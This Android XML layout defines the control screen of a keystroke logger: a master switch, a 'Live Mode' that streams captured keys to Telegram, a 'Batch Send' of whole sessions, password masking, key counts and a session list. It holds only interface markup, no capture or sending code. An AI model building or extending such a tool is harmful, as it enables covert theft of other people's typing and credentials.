<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/kl_root"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#0F172A">

  <!-- ── Header ── -->
  <LinearLayout
      android:layout_width="match_parent"
      android:layout_height="wrap_content"
      android:orientation="horizontal"
      android:background="#1E293B"
      android:paddingStart="16dp"
      android:paddingEnd="16dp"
      android:paddingTop="16dp"
      android:paddingBottom="16dp"
      android:gravity="center_vertical">

    <LinearLayout
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:orientation="vertical">
      <TextView
          android:layout_width="wrap_content"
          android:layout_height="wrap_content"
          android:text="⌨️  Keystroke Logger"
          android:textColor="#F8FAFC"
          android:textSize="18sp"
          android:textStyle="bold"/>
      <TextView
          android:id="@+id/kl_subtitle"
          android:layout_width="wrap_content"
          android:layout_height="wrap_content"
          android:text="Advanced key capture &amp; analysis"
          android:textColor="#94A3B8"
          android:textSize="11sp"
          android:layout_marginTop="2dp"/>
    </LinearLayout>

    <View
        android:id="@+id/kl_status_dot"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:background="@drawable/dev_console_dot"
        android:layout_marginEnd="6dp"/>
    <TextView
        android:id="@+id/kl_status_label"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="OFF"
        android:textColor="#EF4444"
        android:textSize="11sp"
        android:textStyle="bold"/>
  </LinearLayout>

  <ScrollView
      android:layout_width="match_parent"
      android:layout_height="match_parent">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="14dp">

      <!-- ── Master Toggle ── -->
      <LinearLayout
          android:id="@+id/kl_card_enable"
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:orientation="horizontal"
          android:background="#1E293B"
          android:padding="16dp"
          android:gravity="center_vertical"
          android:clickable="true"
          android:focusable="true">
        <LinearLayout
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical">
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="🔴  Master Switch"
              android:textColor="#F8FAFC"
              android:textSize="14sp"
              android:textStyle="bold"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Enable or disable all keystroke logging"
              android:textColor="#64748B"
              android:textSize="11sp"
              android:layout_marginTop="2dp"/>
        </LinearLayout>
        <Switch
            android:id="@+id/kl_switch_enable"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"/>
      </LinearLayout>

      <View android:layout_width="match_parent" android:layout_height="1dp"
          android:background="#334155" android:layout_marginTop="10dp" android:layout_marginBottom="10dp"/>

      <!-- ── Settings Grid ── -->
      <TextView
          android:layout_width="wrap_content"
          android:layout_height="wrap_content"
          android:text="⚙️  SETTINGS"
          android:textColor="#64748B"
          android:textSize="10sp"
          android:textStyle="bold"
          android:letterSpacing="0.1"
          android:layout_marginBottom="8dp"/>

      <LinearLayout
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:orientation="horizontal">

        <LinearLayout
            android:id="@+id/kl_card_live"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical"
            android:background="#1E293B"
            android:padding="14dp"
            android:clickable="true"
            android:focusable="true">
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="📡"
              android:textSize="22sp"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Live Mode"
              android:textColor="#F8FAFC"
              android:textSize="13sp"
              android:textStyle="bold"
              android:layout_marginTop="6dp"/>
          <TextView
              android:id="@+id/kl_live_val"
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="OFF"
              android:textColor="#EF4444"
              android:textSize="11sp"
              android:layout_marginTop="3dp"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Stream to Telegram instantly"
              android:textColor="#475569"
              android:textSize="9sp"
              android:layout_marginTop="3dp"/>
        </LinearLayout>

        <View android:layout_width="10dp" android:layout_height="1dp"/>

        <LinearLayout
            android:id="@+id/kl_card_mask"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical"
            android:background="#1E293B"
            android:padding="14dp"
            android:clickable="true"
            android:focusable="true">
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="🔒"
              android:textSize="22sp"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Mask Passwords"
              android:textColor="#F8FAFC"
              android:textSize="13sp"
              android:textStyle="bold"
              android:layout_marginTop="6dp"/>
          <TextView
              android:id="@+id/kl_mask_val"
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="ON"
              android:textColor="#22C55E"
              android:textSize="11sp"
              android:layout_marginTop="3dp"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Replace PW chars with ••••"
              android:textColor="#475569"
              android:textSize="9sp"
              android:layout_marginTop="3dp"/>
        </LinearLayout>

        <View android:layout_width="10dp" android:layout_height="1dp"/>

        <LinearLayout
            android:id="@+id/kl_card_batch"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical"
            android:background="#1E293B"
            android:padding="14dp"
            android:clickable="true"
            android:focusable="true">
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="📦"
              android:textSize="22sp"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Batch Send"
              android:textColor="#F8FAFC"
              android:textSize="13sp"
              android:textStyle="bold"
              android:layout_marginTop="6dp"/>
          <TextView
              android:id="@+id/kl_batch_val"
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="ON"
              android:textColor="#22C55E"
              android:textSize="11sp"
              android:layout_marginTop="3dp"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Send full session on close"
              android:textColor="#475569"
              android:textSize="9sp"
              android:layout_marginTop="3dp"/>
        </LinearLayout>

      </LinearLayout>

      <View android:layout_width="match_parent" android:layout_height="1dp"
          android:background="#334155" android:layout_marginTop="14dp" android:layout_marginBottom="10dp"/>

      <!-- ── Stats Row ── -->
      <TextView
          android:layout_width="wrap_content"
          android:layout_height="wrap_content"
          android:text="📊  STATISTICS"
          android:textColor="#64748B"
          android:textSize="10sp"
          android:textStyle="bold"
          android:letterSpacing="0.1"
          android:layout_marginBottom="8dp"/>

      <LinearLayout
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:orientation="horizontal">

        <LinearLayout
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical"
            android:background="#1E293B"
            android:padding="14dp"
            android:gravity="center">
          <TextView
              android:id="@+id/kl_stat_sessions"
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="0"
              android:textColor="#6366F1"
              android:textSize="26sp"
              android:textStyle="bold"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Sessions"
              android:textColor="#64748B"
              android:textSize="10sp"
              android:layout_marginTop="2dp"/>
        </LinearLayout>

        <View android:layout_width="10dp" android:layout_height="1dp"/>

        <LinearLayout
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical"
            android:background="#1E293B"
            android:padding="14dp"
            android:gravity="center">
          <TextView
              android:id="@+id/kl_stat_keys"
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="0"
              android:textColor="#F59E0B"
              android:textSize="26sp"
              android:textStyle="bold"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Total Keys"
              android:textColor="#64748B"
              android:textSize="10sp"
              android:layout_marginTop="2dp"/>
        </LinearLayout>

        <View android:layout_width="10dp" android:layout_height="1dp"/>

        <LinearLayout
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical"
            android:background="#1E293B"
            android:padding="14dp"
            android:gravity="center">
          <TextView
              android:id="@+id/kl_stat_active"
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="—"
              android:textColor="#22C55E"
              android:textSize="18sp"
              android:textStyle="bold"/>
          <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="Active Session"
              android:textColor="#64748B"
              android:textSize="10sp"
              android:layout_marginTop="2dp"/>
        </LinearLayout>

      </LinearLayout>

      <View android:layout_width="match_parent" android:layout_height="1dp"
          android:background="#334155" android:layout_marginTop="14dp" android:layout_marginBottom="10dp"/>

      <!-- ── Session List ── -->
      <LinearLayout
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:orientation="horizontal"
          android:gravity="center_vertical"
          android:layout_marginBottom="8dp">

        <TextView
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="📂  RECENT SESSIONS"
            android:textColor="#64748B"
            android:textSize="10sp"
            android:textStyle="bold"
            android:letterSpacing="0.1"/>

        <TextView
            android:id="@+id/kl_btn_clear"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="🗑 Clear All"
            android:textColor="#EF4444"
            android:textSize="12sp"
            android:padding="6dp"
            android:clickable="true"
            android:focusable="true"/>
      </LinearLayout>

      <ListView
          android:id="@+id/kl_session_list"
          android:layout_width="match_parent"
          android:layout_height="wrap_content"
          android:divider="@null"
          android:scrollbars="none"/>

      <TextView
          android:id="@+id/kl_empty_text"
          android:layout_width="wrap_content"
          android:layout_height="wrap_content"
          android:layout_gravity="center"
          android:text="No sessions recorded yet.\nEnable logging and start typing."
          android:textColor="#475569"
          android:textSize="13sp"
          android:gravity="center"
          android:padding="30dp"
          android:visibility="gone"/>

    </LinearLayout>

  </ScrollView>

</LinearLayout>
